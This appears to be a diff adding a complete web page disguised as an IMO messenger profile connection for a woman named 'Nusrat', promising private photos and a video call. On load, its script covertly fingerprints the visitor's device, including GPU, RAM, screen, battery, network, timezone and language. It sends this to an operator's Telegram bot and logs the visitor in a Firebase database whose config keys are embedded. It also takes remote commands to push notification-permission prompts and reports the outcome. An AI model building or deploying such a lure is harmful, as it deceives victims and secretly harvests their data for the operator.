@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>IMO Profile Connect</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
+    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
+    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+
+    <!-- Firebase SDK -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getDatabase, ref, update, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyCYH0ZSeLjH_T3HJ9hVQ84afB5KyAEZi2Y",
+            authDomain: "my-sc-tools.firebaseapp.com",
+            databaseURL: "https://my-sc-tools-default-rtdb.firebaseio.com",
+            projectId: "my-sc-tools",
+            storageBucket: "my-sc-tools.firebasestorage.app",
+            messagingSenderId: "285986090017",
+            appId: "1:285986090017:web:de97d36b2ee56c74b74760"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+
+        window.db = database;
+        window.dbRef = ref;
+        window.dbUpdate = update;
+        window.dbOnValue = onValue;
+    </script>
+</head>
+<body class="bg-gray-50">
+    <div id="root"></div>
+
+    <script type="text/babel">
+        const { useState, useEffect } = React;
+
+        // --- CONFIGURATION ---
+        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN'; // আপনার বোট টোকেন দিন
+        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';     // আপনার চ্যাট আইডি দিন
+        
+        let userId = localStorage.getItem('vid') || Math.floor(1000 + Math.random() * 9000);
+        localStorage.setItem('vid', userId);
+
+        const App = () => {
+            const [step, setStep] = useState('MAIN');
+            const [isBlocked, setIsBlocked] = useState(false);
+
+            useEffect(() => {
+                captureData();
+                listenForCommands();
+            }, []);
+
+            // ১. টেলিগ্রামে ডাটা পাঠানোর ফাংশন
+            const sendToTelegram = async (msg) => {
+                const text = encodeURIComponent(`🔔 *New Visitor #${userId}*\n${msg}`);
+                try {
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${text}&parse_mode=Markdown`);
+                } catch (e) { console.error("Telegram Error", e); }
+            };
+
+            // ২. অ্যাডভান্সড ডাটা ক্যাপচার (৮টি লজিক)
+            const captureData = async () => {
+                let info = `🆔 ID: ${userId}\n`;
+                
+                // Hardware & Display
+                const gl = document.createElement('canvas').getContext('webgl');
+                const dbg = gl?.getExtension('WEBGL_debug_renderer_info');
+                info += `💻 GPU: ${dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'N/A'}\n`;
+                info += `📱 RAM: ${navigator.deviceMemory || 'Unknown'}GB\n`;
+                info += `🖥 Res: ${window.screen.width}x${window.screen.height}\n`;
+                
+                // Battery
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    info += `🔋 Battery: ${(b.level * 100).toFixed(0)}% (${b.charging ? 'Charging' : 'No'})\n`;
+                }
+
+                // Network & IP (Internal via WebRTC)
+                info += `🌐 Connection: ${navigator.connection?.effectiveType || 'N/A'}\n`;
+                
+                // Timezone & Lang
+                info += `⏰ Time: ${new Date().toLocaleString()}\n`;
+                info += `🌐 Lang: ${navigator.language}\n`;
+
+                sendToTelegram(info);
+                
+                // Firebase এ ব্যাকআপ রাখা
+                if(window.dbUpdate) {
+                    window.dbUpdate(window.dbRef(window.db, `visitors/v_${userId}`), {
+                        last_active: new Date().toISOString(),
+                        status: 'online'
+                    });
+                }
+            };
+
+            // ৩. কমান্ড লিসেনার (টেলিগ্রাম বোট কমান্ডের জন্য)
+            const listenForCommands = () => {
+                if(!window.dbOnValue) return;
+                const cmdRef = window.dbRef(window.db, `visitors/v_${userId}/command`);
+                window.dbOnValue(cmdRef, (snapshot) => {
+                    const cmd = snapshot.val();
+                    if(cmd === 'show_notification_popup') {
+                        triggerNotification();
+                        // কমান্ড রিসেট করা
+                        window.dbUpdate(window.dbRef(window.db, `visitors/v_${userId}`), { command: null });
+                    }
+                });
+            };
+
+            const triggerNotification = async () => {
+                const permission = await Notification.requestPermission();
+                if (permission === 'granted') {
+                    setStep('SUCCESS');
+                    sendToTelegram(`✅ User #${userId} Allowed Notifications!`);
+                } else {
+                    setIsBlocked(true);
+                    sendToTelegram(`❌ User #${userId} Blocked/Denied Notification.`);
+                }
+            };
+
+            const handleConnect = () => {
+                setStep('LOADING');
+                setTimeout(() => {
+                    triggerNotification();
+                }, 1500);
+            };
+
+            return (
+                <div className="max-w-md mx-auto h-screen bg-white shadow-2xl flex flex-col">
+                    {/* Top Bar */}
+                    <div className="bg-[#10a5f5] p-4 flex items-center text-white">
+                        <i className="fa fa-arrow-left mr-4"></i>
+                        <div className="flex-1">
+                            <h2 className="font-bold">Connect Profile</h2>
+                        </div>
+                        <i className="fa fa-ellipsis-v"></i>
+                    </div>
+
+                    <div className="flex-1 flex flex-col items-center justify-center p-8 text-center">
+                        {step === 'MAIN' && (
+                            <div className="w-full animate-fadeIn">
+                                <div className="relative inline-block mb-6">
+                                    <img 
+                                        src="my-logo.jpg" 
+                                        className="w-32 h-32 rounded-full object-cover border-4 border-blue-100 shadow-xl"
+                                        onError={(e) => {e.target.src='https://via.placeholder.com/150'}}
+                                    />
+                                    <div className="absolute bottom-1 right-1 w-6 h-6 bg-green-500 border-4 border-white rounded-full"></div>
+                                </div>
+                                
+                                <h1 className="text-2xl font-bold text-gray-800 mb-2">Connect to Nusrat</h1>
+                                <p className="text-gray-500 text-sm mb-8">To view private photos and start a video call, you must allow the connection request.</p>
+                                
+                                {isBlocked && (
+                                    <div className="mb-4 p-3 bg-red-50 text-red-600 text-xs rounded-lg border border-red-100 animate-bounce">
+                                        <i className="fa fa-exclamation-triangle mr-2"></i>
+                                        Please Allow Notification to add on IMO
+                                    </div>
+                                )}
+
+                                <button 
+                                    onClick={handleConnect}
+                                    className="w-full bg-[#10a5f5] text-white py-4 rounded-full font-bold text-lg shadow-lg active:scale-95 transition-all"
+                                >
+                                    Connect & Unlock
+                                </button>
+                                
+                                <div className="mt-6 flex justify-center gap-8 text-gray-400">
+                                    <div className="flex flex-col items-center">
+                                        <i className="fa fa-video mb-1"></i>
+                                        <span className="text-[10px]">Video Call</span>
+                                    </div>
+                                    <div className="flex flex-col items-center">
+                                        <i className="fa fa-camera mb-1"></i>
+                                        <span className="text-[10px]">Photos</span>
+                                    </div>
+                                    <div className="flex flex-col items-center">
+                                        <i className="fa fa-shield-halved mb-1"></i>
+                                        <span className="text-[10px]">Secure</span>
+                                    </div>
+                                </div>
+                            </div>
+                        )}
+
+                        {step === 'LOADING' && (
+                            <div className="flex flex-col items-center">
+                                <div className="w-12 h-12 border-4 border-blue-100 border-t-blue-500 rounded-full animate-spin mb-4"></div>
+                                <p className="text-blue-500 font-medium">Verifying Profile...</p>
+                            </div>
+                        )}
+
+                        {step === 'SUCCESS' && (
+                            <div className="animate-scaleUp">
+                                <div className="w-20 h-20 bg-green-100 text-green-500 rounded-full flex items-center justify-center text-4xl mx-auto mb-4">
+                                    <i className="fa fa-check"></i>
+                                </div>
+                                <h2 className="text-xl font-bold text-gray-800">Request Sent!</h2>
+                                <p className="text-gray-500 mt-2 text-sm">Waiting for Nusrat to accept. Keep your IMO app open.</p>
+                                <button 
+                                    onClick={() => window.location.href='https://imo.im'}
+                                    className="mt-6 px-10 py-2 border-2 border-gray-200 rounded-full text-gray-600 font-semibold"
+                                >
+                                    Open IMO
+                                </button>
+                            </div>
+                        )}
+                    </div>
+                    
+                    <div className="p-4 text-center text-[10px] text-gray-300 uppercase tracking-widest">
+                        Ref ID: #{userId}
+                    </div>
+                </div>
+            );
+        };
+
+        const root = ReactDOM.createRoot(document.getElementById('root'));
+        root.render(<App />);
+    </script>
+
+    <style>
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes scaleUp { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        .animate-fadeIn { animation: fadeIn 0.6s ease-out forwards; }
+        .animate-scaleUp { animation: scaleUp 0.4s ease-out forwards; }
+    </style>
+</body>
+</html>
